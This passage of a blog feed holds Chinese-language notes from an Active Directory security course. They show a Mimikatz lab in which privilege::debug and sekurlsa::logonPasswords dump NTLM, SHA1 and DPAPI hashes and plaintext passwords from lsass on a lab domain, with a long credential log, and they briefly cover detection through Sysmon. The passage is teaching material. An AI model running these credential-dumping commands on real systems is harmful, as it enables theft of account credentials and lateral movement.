+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>00000000:001fc85a&lt;span style="color:#f92672">]&lt;/span> kuma&lt;span style="color:#ae81ff">\b&lt;/span>ear	1qaz@WSX3edc
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>00000000:001fc85a&lt;span style="color:#f92672">]&lt;/span> kuma&lt;span style="color:#ae81ff">\b&lt;/span>ear	1qaz@WSX3edc
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>00000000:001fc7f9&lt;span style="color:#f92672">]&lt;/span> kuma&lt;span style="color:#ae81ff">\b&lt;/span>ear	1qaz@WSX3edc
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>00000000:001fc7f9&lt;span style="color:#f92672">]&lt;/span> kuma&lt;span style="color:#ae81ff">\b&lt;/span>ear	1qaz@WSX3edc
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>可以看到這個log file用明文的方式新增了我們剛剛打入的密碼&lt;/li>
+&lt;/ol>
+&lt;h3 id="how-to-detect-it">
+ ==How to detect it?==
+ &lt;a class="anchor" href="#how-to-detect-it">#&lt;/a>
+&lt;/h3>
+&lt;p>一樣是用Sysmon的Event ID: 11可以知道，但因為之前安裝不成功所以只能Skip，不過原理就是他是去偵測lsass.exe建立mimilsa.log的瞬間&lt;/p></description></item><item><title>NTUSTISC - AD Note - Lab(透過Mimikatz取得Local Admin的NTLM)</title><link>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x16%E9%80%8F%E9%81%8Emimikatz%E5%8F%96%E5%BE%97local-admin%E7%9A%84ntlm/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x16%E9%80%8F%E9%81%8Emimikatz%E5%8F%96%E5%BE%97local-admin%E7%9A%84ntlm/</guid><description>&lt;h1 id="ntustisc---ad-note---lab透過mimikatz取得local-admin的ntlm">
+ NTUSTISC - AD Note - Lab(透過Mimikatz取得Local Admin的NTLM)
+ &lt;a class="anchor" href="#ntustisc---ad-note---lab%e9%80%8f%e9%81%8emimikatz%e5%8f%96%e5%be%97local-admin%e7%9a%84ntlm">#&lt;/a>
+&lt;/h1>
+&lt;p>[TOC]&lt;/p>
+&lt;p>Lecture Video: &lt;a href="https://youtu.be/Cv2gNQkDM8Q?si=l1na5hFGpAPk6Uux&amp;amp;t=4257">2022/05/04 AD 安全1&lt;/a>&lt;/p>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;p>得到更高權限之後，會想要更多的密碼&lt;/p>
+&lt;ul>
+&lt;li>密碼收集
+&lt;ul>
+&lt;li>SAM.hive(Security Account Manager)&lt;/li>
+&lt;li>Password Spraying(用猜的)&lt;/li>
+&lt;li>GPO
+&lt;ul>
+&lt;li>Where: &lt;code>\\&amp;lt;domain&amp;gt;\SysVol\&amp;lt;domain&amp;gt;\Policie&lt;/code>，以本次實驗為例，就是放在&lt;code>\\kuma.org\SYSVOL\kuma.org\Policies&lt;/code>，接下來就是隨機生成的&lt;code>&amp;lt;UID&amp;gt;\Users\Scripts&lt;/code>和&lt;code>&amp;lt;UID&amp;gt;\Machine\Scripts&lt;/code>，這兩個腳本是我們覺得重要的&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>記憶體(lsass)
+&lt;ul>
+&lt;li>為了獲取更多其他帳號密碼，嘗試逼近Domain Admin，可以使用Mimikatz獲取暫存憑證&lt;/li>
+&lt;li>==What is Mimikatz?==
+&lt;blockquote>
+&lt;p>Mimikatz為一個強力的Windows提權工具，可以提升Process權限、注入Process讀取Process記憶體，可以直接從lsass中獲取當前登錄過系統用戶的帳號明文密碼。
+lsass是微軟Windows系統的安全機制它主要用於本地安全和登陸策略，通常我們在登陸系統時輸入密碼之後，密碼便會儲存在lsass內存中，經過其wdigest和tspkg兩個模塊調用後，對其使用可逆的算法進行加密並存儲在內存之中，而mimikatz正是通過對lsass的逆算獲取到明文密碼。
+簡單說就是所有登入認證都交給lsass，所以他有所有人的認證憑證&lt;/p>&lt;/blockquote>
+&lt;/li>
+&lt;li>Download: &lt;a href="https://github.com/gentilkiwi/mimikatz">Mimikatz-github&lt;/a>&lt;/li>
+&lt;li>How to use:
+Mimikatz最新版本一共三個文件(mimilib.dll、mimikatz.exe、mimidrv.sys)，分為Win32位(多了一個mimilove.exe文件)和X64位
+下載後解壓縮即可使用，裡面分為Win32和X64，Win32是針對Windows32位，而X64是針對64位作業系統，目前絕大部分作業系統為64位&lt;/li>
+&lt;li>==lsass.exe VS SAM==
+SAM只會存取本地用戶的NTLM Hash，而lsass.exe是只要有存取過目前電腦的使用者都會被記錄，例如domain admin或是其他使用者利用smb連過來也會被lsass紀錄&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h2 id="lab">
+ Lab
+ &lt;a class="anchor" href="#lab">#&lt;/a>
+&lt;/h2>
+&lt;h3 id="透過mimikatz取得local-admin的ntlm">
+ ==透過Mimikatz取得Local Admin的NTLM==
+ &lt;a class="anchor" href="#%e9%80%8f%e9%81%8emimikatz%e5%8f%96%e5%be%97local-admin%e7%9a%84ntlm">#&lt;/a>
+&lt;/h3>
+&lt;ol>
+&lt;li>Activate Mimikatz
+進入&lt;code>C:\tools\mimikatz_trunk\x64&lt;/code>右鍵以系統管理員身分執行mimikatz.exe(一定要用系統管理員才能執行提權的debug)&lt;/li>
+&lt;li>起手式
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>mimikatz &lt;span style="color:#75715e"># Privilege::Debug&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Privilege &lt;span style="color:#e6db74">&amp;#39;20&amp;#39;&lt;/span> OK
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>mimikatz &lt;span style="color:#75715e"># log&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Using &lt;span style="color:#e6db74">&amp;#39;mimikatz.log&amp;#39;&lt;/span> &lt;span style="color:#66d9ef">for&lt;/span> logfile : OK
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>mimikatz &lt;span style="color:#75715e"># Sekurlsa::logonPasswords&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>:::spoiler Log Reuslt
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>Using &lt;span style="color:#e6db74">&amp;#39;mimikatz.log&amp;#39;&lt;/span> &lt;span style="color:#66d9ef">for&lt;/span> logfile : OK
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>mimikatz &lt;span style="color:#75715e"># Sekurlsa::logonPasswords&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Authentication Id : &lt;span style="color:#ae81ff">0&lt;/span> ; &lt;span style="color:#ae81ff">23133312&lt;/span> &lt;span style="color:#f92672">(&lt;/span>00000000:0160fc80&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Session : CachedInteractive from &lt;span style="color:#ae81ff">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User Name : Administrator
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Domain : kuma
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Server : WIN-818G5VCOLJO
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Time : 2023/9/4 06:07:18
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SID : S-1-5-21-306106713-2531972042-334329499-500
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> msv :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">[&lt;/span>00000003&lt;span style="color:#f92672">]&lt;/span> Primary
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : Administrator
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * NTLM : 7ecffff0c3548187607a14bad0f88bb1
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * SHA1 : 47af9144ed0e6f8964c1453dc7c2219dbdf046f0
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * DPAPI : cf967ea9c9c0f9d58b79fdd040270648
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tspkg :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> wdigest :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : Administrator
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> kerberos :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : Administrator
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : KUMA.ORG
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : 1qaz@WSX3edc
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssp :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> credman :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cloudap :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Authentication Id : &lt;span style="color:#ae81ff">0&lt;/span> ; &lt;span style="color:#ae81ff">20047794&lt;/span> &lt;span style="color:#f92672">(&lt;/span>00000000:0131e7b2&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Session : CachedInteractive from &lt;span style="color:#ae81ff">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User Name : Administrator
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Domain : kuma
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Server : WIN-818G5VCOLJO
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Time : 2023/9/4 10:19:22
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SID : S-1-5-21-306106713-2531972042-334329499-500
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> msv :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">[&lt;/span>00000003&lt;span style="color:#f92672">]&lt;/span> Primary
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : Administrator
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * NTLM : 7ecffff0c3548187607a14bad0f88bb1
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * SHA1 : 47af9144ed0e6f8964c1453dc7c2219dbdf046f0
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * DPAPI : cf967ea9c9c0f9d58b79fdd040270648
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tspkg :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> wdigest :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : Administrator
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> kerberos :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : Administrator
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : KUMA.ORG
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssp :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> credman :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cloudap :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Authentication Id : &lt;span style="color:#ae81ff">0&lt;/span> ; &lt;span style="color:#ae81ff">16441076&lt;/span> &lt;span style="color:#f92672">(&lt;/span>00000000:00fadef4&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Session : Interactive from &lt;span style="color:#ae81ff">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User Name : administrator
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Domain : kuma
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Server : WIN-818G5VCOLJO
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Time : 2023/9/4 12:44:48
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SID : S-1-5-21-306106713-2531972042-334329499-500
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> msv :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">[&lt;/span>00000003&lt;span style="color:#f92672">]&lt;/span> Primary
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : Administrator
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * NTLM : 7ecffff0c3548187607a14bad0f88bb1
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * SHA1 : 47af9144ed0e6f8964c1453dc7c2219dbdf046f0
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * DPAPI : cf967ea9c9c0f9d58b79fdd040270648
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tspkg :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> wdigest :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : Administrator
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> kerberos :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : administrator
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : KUMA.ORG
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssp :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> credman :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cloudap :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Authentication Id : &lt;span style="color:#ae81ff">0&lt;/span> ; &lt;span style="color:#ae81ff">14849757&lt;/span> &lt;span style="color:#f92672">(&lt;/span>00000000:00e296dd&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Session : Service from &lt;span style="color:#ae81ff">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User Name : DefaultAppPool
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Domain : IIS APPPOOL
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Server : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Time : 2023/9/3 09:44:12
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SID : S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> msv :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">[&lt;/span>00000003&lt;span style="color:#f92672">]&lt;/span> Primary
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * NTLM : 5648c9d78a770f3e0f727a5fac99da5a
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * SHA1 : 074499733e91d086762a4bc2df67f5fa51c43221
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tspkg :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> wdigest :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> kerberos :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma.org
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : maj&lt;span style="color:#e6db74">&amp;#34;2g&amp;lt;h(&amp;amp;iQZ7kqFHQ4X&amp;amp;c;_wQq3V;*gq.(A=4&amp;amp;)\2eesNp8S=W)C,&amp;#34;&lt;/span>nM:ns?6m.%;K4+CSGDFew&amp;gt;VaNQ;N_&lt;span style="color:#f92672">)&lt;/span>?mB1&lt;span style="color:#ae81ff">\P&lt;/span>9udE7Gs&lt;span style="color:#e6db74">&amp;#39;Lsr ccxo*CyL=JdK&amp;#34;&amp;#39;&lt;/span>kF
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssp :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> credman :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cloudap :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Authentication Id : &lt;span style="color:#ae81ff">0&lt;/span> ; &lt;span style="color:#ae81ff">1299130&lt;/span> &lt;span style="color:#f92672">(&lt;/span>00000000:0013d2ba&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Session : Interactive from &lt;span style="color:#ae81ff">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User Name : bear
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Domain : kuma
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Server : WIN-818G5VCOLJO
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Time : 2023/8/29 12:47:58
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SID : S-1-5-21-306106713-2531972042-334329499-2101
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> msv :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">[&lt;/span>00000003&lt;span style="color:#f92672">]&lt;/span> Primary
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : bear
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * NTLM : 7ecffff0c3548187607a14bad0f88bb1
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * SHA1 : 47af9144ed0e6f8964c1453dc7c2219dbdf046f0
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * DPAPI : 4057a0d0b94378dd03224e8b3d28a006
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tspkg :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> wdigest :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : bear
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> kerberos :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : bear
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : KUMA.ORG
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssp :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> credman :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cloudap :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Authentication Id : &lt;span style="color:#ae81ff">0&lt;/span> ; &lt;span style="color:#ae81ff">995&lt;/span> &lt;span style="color:#f92672">(&lt;/span>00000000:000003e3&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Session : Service from &lt;span style="color:#ae81ff">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User Name : IUSR
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Domain : NT AUTHORITY
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Server : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Time : 2023/8/29 12:40:42
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SID : S-1-5-17
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> msv :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tspkg :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> wdigest :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> kerberos :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssp :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> credman :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cloudap :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Authentication Id : &lt;span style="color:#ae81ff">0&lt;/span> ; &lt;span style="color:#ae81ff">997&lt;/span> &lt;span style="color:#f92672">(&lt;/span>00000000:000003e5&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Session : Service from &lt;span style="color:#ae81ff">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User Name : LOCAL SERVICE
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Domain : NT AUTHORITY
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Server : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Time : 2023/8/29 12:40:39
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SID : S-1-5-19
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> msv :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tspkg :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> wdigest :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> kerberos :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Password : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ssp :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> credman :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cloudap :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Authentication Id : &lt;span style="color:#ae81ff">0&lt;/span> ; &lt;span style="color:#ae81ff">70138&lt;/span> &lt;span style="color:#f92672">(&lt;/span>00000000:000111fa&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Session : Interactive from &lt;span style="color:#ae81ff">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>User Name : DWM-1
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Domain : Window Manager
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Server : &lt;span style="color:#f92672">(&lt;/span>null&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Logon Time : 2023/8/29 12:40:38
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SID : S-1-5-90-0-1
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> msv :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">[&lt;/span>00000003&lt;span style="color:#f92672">]&lt;/span> Primary
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * NTLM : 5648c9d78a770f3e0f727a5fac99da5a
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * SHA1 : 074499733e91d086762a4bc2df67f5fa51c43221
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tspkg :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> wdigest :	
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Username : DESKTOP-G95U93T$
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> * Domain : kuma
